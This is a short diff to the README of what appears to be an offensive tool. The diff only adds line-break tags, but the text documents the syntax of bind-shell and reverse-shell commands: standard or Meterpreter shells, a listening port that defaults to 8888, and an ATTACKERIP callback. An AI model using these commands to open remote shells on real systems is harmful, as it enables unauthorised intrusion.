@@ -51,9 +51,9 @@ exploit -j<br>
 
 `| bindshell SHELLTYPE PORTNUMBER` 
 
-SHELLTYPE - Specify std or msf
-std = Standard Shell
-msf = Meterpreter Shell
+SHELLTYPE - Specify std or msf<br>
+std = Standard Shell<br>
+msf = Meterpreter Shell<br>
 
 PORTNUMBER - Specify the port you want the bind shell to listen on.
 Defaults to 8888
@@ -63,9 +63,9 @@ Defaults to 8888
 
 `| revshell SHELLTYPE ATTACKERIP ATTACKERPORT`
 
-SHELLTYPE - Specify std or msf
-std = Standard Shell
-msf = Meterpreter Shell
+SHELLTYPE - Specify std or msf<br>
+std = Standard Shell<br>
+msf = Meterpreter Shell<br>
 
 ATTACKERIP - Specify the IP that you want the shell to be sent back to. 
 
